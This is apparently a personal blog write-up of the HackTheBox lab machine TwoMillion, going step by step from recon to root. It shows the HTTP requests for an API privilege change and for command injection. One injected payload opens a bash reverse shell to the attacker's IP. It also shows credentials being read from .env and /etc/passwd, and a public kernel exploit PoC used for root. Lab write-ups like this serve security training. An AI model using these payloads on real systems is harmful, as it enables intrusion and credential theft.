---
title: TwoMillion HackTheBox - Writeup
categories: [Hacking, HackTheBox]
tags: [hacking, htb, hackthebox, writeup]     # TAG names should always be lowercase
---


## TwoMillion HackTheBox - Writeup

### Overview
From HTB:


`TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox.`


---

### Recon

#### nmap
`nmap -sC -Pn -sV -p- 10.129.229.66`
Options explanation:
- `-sC` Runs default and safe scripts, they potentially identify vulnerabilites, enumerate services and gather additional info
- `-Pn` it skips the host discovery phase, so no pings to the target and we treat it as if its online.
- `sV` enables service version detection during scanning.
- `-p-` scans all the ports(1-65535).


We find two open TCP ports, SSH(22) and HTTP(80):

```
Nmap scan report for 10.129.229.66
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.14 seconds
```

We also get some information that the server is running ubuntu linux and nginx as the web server.

I have also went ahead and added the following entry to /etc/hosts:
`echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts`

#### TCP(80)
Upon entry we are greeted with the old HTB page!
![Old HTB Main page](/assets/images/OldHTBMainPage.png)

Now on the old HTB to even register you had to get an invite code and it seems its the same here:
![Old HTB register](/assets/images/OldHTBRegister.png)

in the `2million.htb/invite` we cab find an interesting javascript function `inviteapi.min.js`, but it seems obfuscated:

```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Now lets clean it up using online tools I recommend using `https://lelinhtinh.github.io/de4js/`

After cleaning up we get two functions:

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

The MakeInviteCode looks interesting enough, so I send a POST request to it and got the following response:

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Oct 2023 13:59:10 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 249

{"0":200,"success":1,
"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},
"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```


We can see that the data is "encrypted" using ROT13 so lets reverse that.

After reversing the encryption we get:
In order to generate the invite code, make a POST request to `/api/v1/invite/generate`, so lets make another POST to that:


```
POST /api/v1/invite/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=m1m3o51qc1l8uigsqgr6df6s9f
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

And it seems like we got the code in the response:


```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Oct 2023 14:01:58 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 91

{"0":200,"success":1,"data":{"code":"WUxPWFEtTkRJUEYtSjVTWVMtQzhKUkg=","format":"encoded"}}
```

But after trying the code I got information that it is invalid, why? Because its encoded in base64, so I went and decoded it:
`YLOXQ-NDIPF-J5SYS-C8JRH`

Now we could finally make an account
![Alt text](/assets/images/TwoMillionMakingAccount.png)

After logging in we are informed that a database migration is being performed and some features are unavailable. So as I looked around most of the pages didn't work, but i could access the `/home/access` endpoint.

I was kinda lost here at this point so I googled how to test API's [Hack Tricks API](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/web-api-pentesting), now after playing around and changing the url I got all the api routes by requesting `/api/v1`:



### Getting Admin Access

To add our created user an admin we can send a PUT request:


```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=m1m3o51qc1l8uigsqgr6df6s9f
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 43

{
"email": "asd@asd.asd",
"is_admin":1
}
```

Now our user is added as an admin

#### Injection

Now the endpoint /api/v1/admin/vpn/generate was available only when someone was an admin, so it might be generating the vpn key by doing <./program>, so I tried to inject commands by putting a `;` and breaking into another command:


```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=m1m3o51qc1l8uigsqgr6df6s9f
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 29

{
"username": "asd; whoami"}
```


aaand it didn't work:


```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Oct 2023 15:45:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
```


but it seems like i have broken the script used to generate the vpn key, so after spending a lot of time trying to get something here I learned that I just needed to comment the rest of the code out with a `#` :) Let's try that again!


```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=m1m3o51qc1l8uigsqgr6df6s9f
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 29

{
"username": "asd; whoami #" }
```


And this time it works!


```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Oct 2023 15:47:24 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 9

www-data
```



#### Getting www-data shell


```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=m1m3o51qc1l8uigsqgr6df6s9f
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 65

{
"username": "asd; bash -c 'bash -i >& /dev/tcp/10.10.14.64/1313 0>&1' #" }
```


and I have started a listener on my box with:
 `nc -lvnp 1313`


```
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1313
Ncat: Listening on 0.0.0.0:1313
Ncat: Connection from 10.129.229.66.
Ncat: Connection from 10.129.229.66:54120.
bash: cannot set terminal process group (1098): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ ls
ls
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
www-data@2million:~/html$
```


After getting the shell and looking around I found that there was no userflag here, but there was a interesting dotfile `.env`, which contained a username:password combo for `admin`

I checked `/etc/passwd` and found out that such a user exists so i tried to login as him and it worked!


```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=<Redacted>
www-data@2million:~/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
<Cleaned up>
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000::/home/admin:/bin/bash
<Cleaned up>
```


Logging in as user admin we get information that he has mail. We can find mail in linux under `/var/mail/$USER$`

It seems that admin has received the following mail:


```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```


Which hints us that in order to get the root we should look into CVE for the web host. After researching the OverlayFS / FUSE kernel CVE for linux I stumbled upon CVE-2023-0386 [github POC by sxlmnwb](https://github.com/sxlmnwb/CVE-2023-0386) In short the issue with this CVE is the overlay file system and how files are being moved between them. There are probably better details on the CVE on other blogs :>

After downloading the POC I send it over using scp

`scp CVE-2023-0386-master.zip admin@2million.htb:/tmp/`


After that following the instructions I make two terminal session and in one run:


```

admin@2million:/tmp/CVE-2023-0386-master$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0

```


This terminal session hangs and we have to move to the other one to run the exploit and get root:



```

admin@2million:/tmp/CVE-2023-0386-master$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Oct 27 16:28 .
drwxrwxr-x 6 root   root     4096 Oct 27 16:28 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-master# 

```


Thanks for reading!
If you got any questions, tips for me or any other inquiry shoot me an email!